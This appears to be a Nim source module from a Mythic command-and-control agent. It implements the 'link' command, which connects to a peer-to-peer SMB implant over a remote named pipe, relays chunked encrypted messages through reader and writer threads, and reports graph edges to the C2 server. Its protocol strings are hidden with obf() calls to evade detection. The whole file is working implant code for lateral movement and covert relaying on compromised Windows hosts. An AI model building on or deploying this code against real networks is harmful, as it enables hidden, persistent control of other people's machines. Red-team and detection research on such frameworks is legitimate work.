when not defined(windows):
  {.error: "Link command (SMB) is only supported on Windows".}

import std/[json, strformat, os, tables, base64]
import ../utils/m_responses
import ../utils/debug
import ../utils/strenc

type
  # Windows named pipe handle types
  HANDLE = int
  DWORD = uint32
  BOOL = int32
  LPCWSTR = WideCString
  LPOVERLAPPED = pointer
  LPDWORD = ptr DWORD
  LPVOID = pointer
  LPCVOID = pointer

const
  GENERIC_READ = 0x80000000'u32
  GENERIC_WRITE = 0x40000000'u32
  OPEN_EXISTING = 3
  FILE_ATTRIBUTE_NORMAL = 0x80
  INVALID_HANDLE_VALUE = -1

{.push importc, stdcall, dynlib: "kernel32".}
proc CreateFileW(
  lpFileName: LPCWSTR,
  dwDesiredAccess: DWORD,
  dwShareMode: DWORD,
  lpSecurityAttributes: pointer,
  dwCreationDisposition: DWORD,
  dwFlagsAndAttributes: DWORD,
  hTemplateFile: HANDLE
): HANDLE

proc CloseHandle(hObject: HANDLE): BOOL
proc ReadFile(hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, 
              lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): BOOL
proc WriteFile(hFile: HANDLE, lpBuffer: LPCVOID, nNumberOfBytesToWrite: DWORD,
               lpNumberOfBytesWritten: LPDWORD, lpOverlapped: LPOVERLAPPED): BOOL
proc FlushFileBuffers(hFile: HANDLE): BOOL
proc GetLastError(): DWORD
{.pop.}

type
  LinkConnectionObj = object
    agentUuid: string
    pipeHandle: HANDLE
    active: bool
    receivedEof: bool  # True when reader thread sends empty seq EOF signal
    inChannel: ptr Channel[seq[byte]]   # Mythic → Writer → Pipe
    outChannel: ptr Channel[seq[byte]]  # Pipe → Reader → Mythic
    readerThread: Thread[ptr LinkConnectionObj]
    writerThread: Thread[ptr LinkConnectionObj]
  
  LinkConnection = ref object
    agentUuid: string
    pipeHandle: HANDLE
    active: bool
    receivedEof: bool
    inChannel: ptr Channel[seq[byte]]
    outChannel: ptr Channel[seq[byte]]
    readerThread: Thread[ptr LinkConnectionObj]
    writerThread: Thread[ptr LinkConnectionObj]
    sharedPtr: ptr LinkConnectionObj  # Stable pointer for threads

var
  activeLinkConnections* {.threadvar.}: Table[string, LinkConnection]

proc sendChunkedMessage(pipeHandle: HANDLE, message: seq[byte]): bool =
  ## Send message with chunked protocol (12-byte header per chunk)
  const CHUNK_SIZE = 1024
  let messageLen = message.len
  let totalChunks = (messageLen + CHUNK_SIZE - 1) div CHUNK_SIZE
  
  debug &"[DEBUG] Link: Sending message in {totalChunks} chunks ({messageLen} bytes total)"
  
  for chunkIndex in 0..<totalChunks:
    let startPos = chunkIndex * CHUNK_SIZE
    let endPos = min(startPos + CHUNK_SIZE, messageLen)
    let chunkDataLen = endPos - startPos
    
    # Build chunk header: chunk_length (12 + data) + total_chunks + chunk_index
    let chunkLength = (12 + chunkDataLen).uint32
    
    var headerBytes: array[12, byte]
    # chunk_length (big-endian)
    headerBytes[0] = byte((chunkLength shr 24) and 0xFF)
    headerBytes[1] = byte((chunkLength shr 16) and 0xFF)
    headerBytes[2] = byte((chunkLength shr 8) and 0xFF)
    headerBytes[3] = byte(chunkLength and 0xFF)
    
    # total_chunks (big-endian)
    let totalChunksU32 = totalChunks.uint32
    headerBytes[4] = byte((totalChunksU32 shr 24) and 0xFF)
    headerBytes[5] = byte((totalChunksU32 shr 16) and 0xFF)
    headerBytes[6] = byte((totalChunksU32 shr 8) and 0xFF)
    headerBytes[7] = byte(totalChunksU32 and 0xFF)
    
    # chunk_index (big-endian)
    let chunkIndexU32 = chunkIndex.uint32
    headerBytes[8] = byte((chunkIndexU32 shr 24) and 0xFF)
    headerBytes[9] = byte((chunkIndexU32 shr 16) and 0xFF)
    headerBytes[10] = byte((chunkIndexU32 shr 8) and 0xFF)
    headerBytes[11] = byte(chunkIndexU32 and 0xFF)
    
    # Write header
    debug &"[DEBUG] Link: About to write header (chunk {chunkIndex+1}/{totalChunks})"
    var bytesWritten: DWORD = 0
    let writeResult = WriteFile(pipeHandle, addr headerBytes[0], 12, addr bytesWritten, nil)
    debug &"[DEBUG] Link: WriteFile header result={writeResult}, bytesWritten={bytesWritten}"
    
    if writeResult == 0:
      let err = GetLastError()
      debug &"[DEBUG] Link: Failed to write chunk header, error: {err}"
      return false
    
    if bytesWritten != 12:
      debug &"[DEBUG] Link: Incomplete header write: {bytesWritten}/12 bytes"
      return false
    
    debug &"[DEBUG] Link: Wrote chunk header {chunkIndex+1}/{totalChunks} successfully"
    
    # Write chunk data
    if chunkDataLen > 0:
      debug &"[DEBUG] Link: About to write {chunkDataLen} bytes of data"
      bytesWritten = 0
      let dataWriteResult = WriteFile(pipeHandle, unsafeAddr message[startPos], chunkDataLen.DWORD, addr bytesWritten, nil)
      debug &"[DEBUG] Link: WriteFile data result={dataWriteResult}, bytesWritten={bytesWritten}"
      
      if dataWriteResult == 0:
        let err = GetLastError()
        debug &"[DEBUG] Link: Failed to write chunk data, error: {err}"
        return false
      
      if bytesWritten.int != chunkDataLen:
        debug &"[DEBUG] Link: Incomplete data write: {bytesWritten}/{chunkDataLen} bytes"
        return false
      
      debug &"[DEBUG] Link: Wrote {bytesWritten} bytes of chunk data successfully"
  
  # Flush pipe buffers to ensure data is sent immediately
  debug "[DEBUG] Link: About to call FlushFileBuffers"
  let flushResult = FlushFileBuffers(pipeHandle)
  debug &"[DEBUG] Link: FlushFileBuffers result={flushResult}"
  if flushResult == 0:
    let err = GetLastError()
    debug &"[DEBUG] Link: FlushFileBuffers failed, error: {err}"
  
  debug "[DEBUG] Link: Message sent successfully"
  return true

proc receiveChunkedMessage(pipeHandle: HANDLE): seq[byte] =
  ## Receive message with chunked protocol
  var messageBuffer: seq[byte] = @[]
  var totalChunks: uint32 = 0
  var receivedChunks: uint32 = 0
  
  while true:
    # Read 12-byte metadata header
    var headerBytes: array[12, byte]
    var bytesRead: DWORD = 0
    
    if ReadFile(pipeHandle, addr headerBytes[0], 12, addr bytesRead, nil) == 0:
      debug &"[DEBUG] Link: Failed to read chunk header, error: {GetLastError()}"
      return @[]
    
    if bytesRead != 12:
      debug &"[DEBUG] Link: Incomplete chunk header read: {bytesRead} bytes"
      return @[]
    
    # Parse header (big-endian)
    let chunkLength = (headerBytes[0].uint32 shl 24) or 
                      (headerBytes[1].uint32 shl 16) or 
                      (headerBytes[2].uint32 shl 8) or 
                      headerBytes[3].uint32
    
    totalChunks = (headerBytes[4].uint32 shl 24) or 
                  (headerBytes[5].uint32 shl 16) or 
                  (headerBytes[6].uint32 shl 8) or 
                  headerBytes[7].uint32
    
    let chunkIndex = (headerBytes[8].uint32 shl 24) or 
                     (headerBytes[9].uint32 shl 16) or 
                     (headerBytes[10].uint32 shl 8) or 
                     headerBytes[11].uint32
    
    if chunkIndex >= totalChunks:
      debug &"[DEBUG] Link: Invalid chunk index: {chunkIndex}"
      return @[]
    
    # Read chunk data
    let chunkDataLen = (chunkLength - 12).int
    if chunkDataLen < 0 or chunkDataLen > 100_000_000:
      debug &"[DEBUG] Link: Invalid chunk data length: {chunkDataLen}"
      return @[]
    
    if chunkDataLen > 0:
      var chunkData = newSeq[byte](chunkDataLen)
      bytesRead = 0
      
      if ReadFile(pipeHandle, addr chunkData[0], chunkDataLen.DWORD, addr bytesRead, nil) == 0:
        debug &"[DEBUG] Link: Failed to read chunk data, error: {GetLastError()}"
        return @[]
      
      if bytesRead.int != chunkDataLen:
        debug &"[DEBUG] Link: Incomplete chunk data read: {bytesRead} bytes"
        return @[]
      
      messageBuffer.add(chunkData)
    
    receivedChunks += 1
    
    if receivedChunks == totalChunks:
      break
  
  debug &"[DEBUG] Link: Received complete message ({messageBuffer.len} bytes)"
  return messageBuffer

proc readFromSmbAgent(conn: ptr LinkConnectionObj) {.thread.} =
  ## Reader thread: reads from SMB agent pipe and sends to main thread via outChannel
  debug "[DEBUG] Link reader thread started"
  debug &"[DEBUG] Link reader: pipeHandle={conn.pipeHandle}, active={conn.active}"
  
  while conn.active:
    try:
      debug "[DEBUG] Link reader: Attempting to read chunked message from pipe..."
      # Read chunked message from SMB agent
      let data = receiveChunkedMessage(conn.pipeHandle)
      
      if data.len == 0:
        # Connection closed or error
        debug "[DEBUG] Link reader: Connection closed, sending EOF and exiting"
        conn.active = false  # Mark as inactive to stop writer thread too
        conn.outChannel[].send(@[])  # EOF signal
        break
      
      debug &"[DEBUG] Link reader: Received {data.len} bytes from SMB agent"
      
      # Send to main thread
      conn.outChannel[].send(data)
      debug &"[DEBUG] Link reader: Sent {data.len} bytes to outChannel"
      
    except:
      let e = getCurrentException()
      debug &"[DEBUG] Link reader error: {e.msg}, sending EOF"
      conn.active = false  # Mark as inactive to stop writer thread too
      conn.outChannel[].send(@[])  # EOF signal
      break
  
  # Close pipe from reader side when exiting
  try:
    discard CloseHandle(conn.pipeHandle)
    debug "[DEBUG] Link reader: Pipe handle closed"
  except:
    discard
  
  debug "[DEBUG] Link reader thread exited"

proc writeToSmbAgent(conn: ptr LinkConnectionObj) {.thread.} =
  ## Writer thread: receives data from main thread via inChannel and writes to SMB agent pipe
  debug "[DEBUG] Link writer thread started"
  
  while conn.active:
    try:
      # Use tryRecv with timeout instead of blocking recv to check conn.active periodically
      let (hasData, data) = conn.inChannel[].tryRecv()
      
      if not hasData:
        # No data available, sleep briefly and check again
        sleep(50)  # 50ms
        continue
      
      if data.len == 0:
        # Exit signal
        debug "[DEBUG] Link writer: Received exit signal"
        break
      
      debug &"[DEBUG] Link writer: Sending {data.len} bytes to SMB agent"
      
      # Send to SMB agent
      if not sendChunkedMessage(conn.pipeHandle, data):
        debug "[DEBUG] Link writer: Send failed"
        conn.active = false  # Signal that connection is dead
        break
      
    except:
      let e = getCurrentException()
      debug &"[DEBUG] Link writer error: {e.msg}"
      conn.active = false  # Signal that connection is dead
      break
  
  debug "[DEBUG] Link writer thread exited"

proc createLinkMessage*(agentUuid: string, message: string): JsonNode =
  ## Create a delegate message for the connected agent
  result = %*{
    obf("delegates"): [
      %*{
        obf("message"): message,
        obf("uuid"): agentUuid,
        obf("c2_profile"): "smb"
      }
    ]
  }

proc checkActiveLinkConnections*(): seq[JsonNode] =
  ## Check all active link connections for data from SMB agents
  ## Returns array of delegate messages to send to Mythic
  result = @[]
  var toDelete: seq[string] = @[]
  var toRekey: seq[tuple[oldUuid: string, newUuid: string, conn: LinkConnection]] = @[]
  
  if activeLinkConnections.len == 0:
    activeLinkConnections = initTable[string, LinkConnection]()
    return
  
  for agentUuid, conn in activeLinkConnections:
    # Check for data from thread (non-blocking) - drain channel even if inactive
    var (hasData, data) = conn.outChannel[].tryRecv()
    
    debug &"[DEBUG] Link: Checking connection for {agentUuid}, hasData: {hasData}, dataLen: {data.len}"
    
    while hasData:
      if data.len == 0:
        # EOF signal from reader thread
        debug &"[DEBUG] Link: Connection to {agentUuid} EOF received from reader thread"
        
        # Send edge removal notification
        result.add(%*{
          obf("edges"): [
            %*{
              obf("source"): "",  # Will be filled by agent
              obf("destination"): agentUuid,
              obf("action"): obf("remove"),
              obf("c2_profile"): "smb"
            }
          ]
        })
        
        conn.active = false
        if not conn.sharedPtr.isNil:
          conn.sharedPtr.active = false
        conn.receivedEof = true
        break
      
      # Parse message and wrap as delegate
      let messageStr = cast[string](data)
      
      # Extract real UUID from message (format: base64(UUID + encrypted_data))
      # This is important because the user-provided UUID might be a placeholder
      var realUuid = agentUuid
      try:
        let decoded = decode(messageStr)
        if decoded.len >= 36:
          realUuid = decoded[0..<36]
          debug &"[DEBUG] Link: Extracted UUID from message: {realUuid}"
          
          # If this is the first message and UUID differs, we need to rekey the connection
          if realUuid != agentUuid:
            debug &"[DEBUG] Link: Real agent UUID is {realUuid}, different from user-provided {agentUuid}"
            toRekey.add((oldUuid: agentUuid, newUuid: realUuid, conn: conn))
          else:
            debug &"[DEBUG] Link: UUID matches user-provided {agentUuid}"
      except Exception as e:
        debug &"[DEBUG] Link: Could not extract UUID from message: {e.msg}, using original"
      
      debug &"[DEBUG] Link: Received {data.len} bytes from {realUuid}, forwarding to Mythic"
      result.add(createLinkMessage(realUuid, messageStr))
      
      # Check for more data
      (hasData, data) = conn.outChannel[].tryRecv()
    
    # Only delete if we've received EOF signal from reader thread
    if conn.receivedEof:
      toDelete.add(agentUuid)
  
  # Rekey connections with real UUIDs
  for item in toRekey:
    if activeLinkConnections.hasKey(item.oldUuid):
      activeLinkConnections.del(item.oldUuid)
      activeLinkConnections[item.newUuid] = item.conn
      debug &"[DEBUG] Link: Rekeyed connection from {item.oldUuid} to {item.newUuid}"
  
  # Delete inactive connections after iteration
  for agentUuid in toDelete:
    if activeLinkConnections.hasKey(agentUuid):
      let conn = activeLinkConnections[agentUuid]
      
      # Join threads first
      try:
        joinThread(conn.readerThread)
      except:
        discard
      try:
        joinThread(conn.writerThread)
      except:
        discard
      
      # Free shared memory used by threads
      if not conn.sharedPtr.isNil:
        if not conn.sharedPtr.inChannel.isNil:
          conn.sharedPtr.inChannel[].close()
          deallocShared(conn.sharedPtr.inChannel)
        if not conn.sharedPtr.outChannel.isNil:
          conn.sharedPtr.outChannel[].close()
          deallocShared(conn.sharedPtr.outChannel)
        deallocShared(conn.sharedPtr)
      
      try:
        discard CloseHandle(conn.pipeHandle)
      except:
        discard
      
      activeLinkConnections.del(agentUuid)
      debug &"[DEBUG] Link: Cleaned up connection to {agentUuid}"

proc rekeyLinkConnection*(oldUuid: string, newUuid: string): bool =
  ## Re-key a connection from old UUID to new UUID (happens when Mythic assigns a new UUID after checkin)
  ## Returns true if re-keying was successful, false if connection doesn't exist
  if not activeLinkConnections.hasKey(oldUuid):
    debug &"[DEBUG] Link: Cannot rekey - no connection for {oldUuid}"
    return false
  
  let conn = activeLinkConnections[oldUuid]
  activeLinkConnections.del(oldUuid)
  activeLinkConnections[newUuid] = conn
  debug &"[DEBUG] Link: Rekeyed connection from {oldUuid} to {newUuid}"
  return true

proc forwardDelegateToLink*(agentUuid: string, message: string): bool =
  ## Forward a delegate message to the connected agent
  ## Returns true if message was queued, false if no active connection
  
  # Debug: show all active connections
  debug "[DEBUG] Link: Active connections: "
  for uuid, conn in activeLinkConnections:
    debug &"  - {uuid} (active: {conn.active})"
  
  if not activeLinkConnections.hasKey(agentUuid):
    debug &"[DEBUG] Link: No active connection for agent {agentUuid}"
    return false
  
  let conn = activeLinkConnections[agentUuid]
  if not conn.active:
    debug &"[DEBUG] Link: Connection for agent {agentUuid} is not active"
    return false
  
  try:
    # Message from Mythic is base64-encoded; SMB profile's decryptPayload expects base64
    # Convert string to seq[byte] properly
    var messageBytes = newSeq[byte](message.len)
    for i in 0..<message.len:
      messageBytes[i] = byte(message[i])
    
    # Debug: show first 50 bytes as hex
    var hexPreview = ""
    for i in 0..<min(50, messageBytes.len):
      hexPreview &= &"{messageBytes[i]:02X} "
    debug &"[DEBUG] Link: Message bytes (first 50): {hexPreview}"
    debug &"[DEBUG] Link: Message string (first 50): {message[0..<min(50, message.len)]}"
    
    conn.inChannel[].send(messageBytes)
    debug &"[DEBUG] Link: Queued {messageBytes.len} bytes (base64) for agent {agentUuid}"
    return true
  except:
    let e = getCurrentException()
    debug &"[DEBUG] Link: Failed to queue message for {agentUuid}: {e.msg}"
    return false

proc handleLink*(taskId: string, params: JsonNode): JsonNode =
  ## Handle linking to a P2P SMB agent
  try:
    debug "[DEBUG] Link: Starting link task"
    
    # Parse connection info
    let connInfo = params[obf("connection_info")]
    let host = connInfo[obf("host")].getStr()
    let agentUuid = connInfo[obf("agent_uuid")].getStr()
    let c2ProfileName = connInfo[obf("c2_profile")][obf("name")].getStr()
    
    # Get pipe name from c2_profile parameters
    var pipeName = "cb_pipe"  # default fallback
    if connInfo.hasKey(obf("c2_profile")) and 
       connInfo[obf("c2_profile")].hasKey(obf("parameters")) and
       connInfo[obf("c2_profile")][obf("parameters")].hasKey(obf("pipename")):
      pipeName = connInfo[obf("c2_profile")][obf("parameters")][obf("pipename")].getStr()
    
    debug &"[DEBUG] Link: Connecting to \\\\{host}\\pipe\\{pipeName} (agent: {agentUuid})"
    
    # Only support SMB for now
    if c2ProfileName != "smb":
      return mythicError(taskId, "Only SMB P2P linking is currently supported for link command")
    
    # Check if already connected
    if activeLinkConnections.hasKey(agentUuid):
      return mythicError(taskId, &"Already linked to agent {agentUuid}")
    
    # Connect to the SMB agent's named pipe
    let pipePath = if host == "localhost" or host == "." or host == "127.0.0.1":
      r"\\.\pipe\" & pipeName
    else:
      r"\\" & host & r"\pipe\" & pipeName
    
    let wPipePath = newWideCString(pipePath)
    
    debug &"[DEBUG] Link: Opening pipe: {pipePath}"
    
    let pipeHandle = CreateFileW(
      wPipePath,
      GENERIC_READ or GENERIC_WRITE,
      0,  # No sharing
      nil,
      OPEN_EXISTING,
      FILE_ATTRIBUTE_NORMAL,
      0
    )
    
    if pipeHandle == INVALID_HANDLE_VALUE:
      let lastError = GetLastError()
      debug &"[DEBUG] Link: Failed to open pipe, error: {lastError}"
      return mythicError(taskId, &"Failed to connect to SMB agent: error {lastError}")
    
    debug "[DEBUG] Link: Connected successfully to named pipe"
    
    # Create channels for thread communication
    var inChan = cast[ptr Channel[seq[byte]]](allocShared0(sizeof(Channel[seq[byte]])))
    inChan[].open()
    var outChan = cast[ptr Channel[seq[byte]]](allocShared0(sizeof(Channel[seq[byte]])))
    outChan[].open()
    
    # Create connection object
    var conn = LinkConnection(
      agentUuid: agentUuid,
      pipeHandle: pipeHandle,
      active: true,
      inChannel: inChan,
      outChannel: outChan
    )
    
    # Allocate stable shared memory for thread-safe access
    let connPtr = cast[ptr LinkConnectionObj](allocShared0(sizeof(LinkConnectionObj)))
    connPtr.agentUuid = agentUuid
    connPtr.pipeHandle = pipeHandle
    connPtr.active = true
    connPtr.receivedEof = false
    connPtr.inChannel = inChan
    connPtr.outChannel = outChan
    
    # Store shared pointer in ref object for later cleanup
    conn.sharedPtr = connPtr
    
    # Store connection in table
    activeLinkConnections[agentUuid] = conn
    
    debug &"[DEBUG] Link: Creating reader and writer threads for {agentUuid}"
    
    # Start threads using stable shared pointer
    createThread(conn.readerThread, readFromSmbAgent, connPtr)
    debug "[DEBUG] Link: Reader thread created"
    createThread(conn.writerThread, writeToSmbAgent, connPtr)
    debug "[DEBUG] Link: Writer thread created"
    
    # Send edge notification to Mythic
    let edgeNotification = %* {
      obf("edges"): [
        %* {
          obf("source"): "",  # Will be filled in by agent
          obf("destination"): agentUuid,
          obf("action"): obf("add"),
          obf("c2_profile"): "smb"
        }
      ]
    }
    
    # Return both success message and edge notification
    result = %* {
      obf("user_output"): &"Linked to SMB agent at {pipePath}",
      obf("completed"): true,
      obf("task_id"): taskId,
      obf("edges"): edgeNotification[obf("edges")]
    }
    
  except Exception as e:
    debug &"[DEBUG] Link: Task error: {e.msg}"
    return mythicError(taskId, &"Link task failed: {e.msg}")
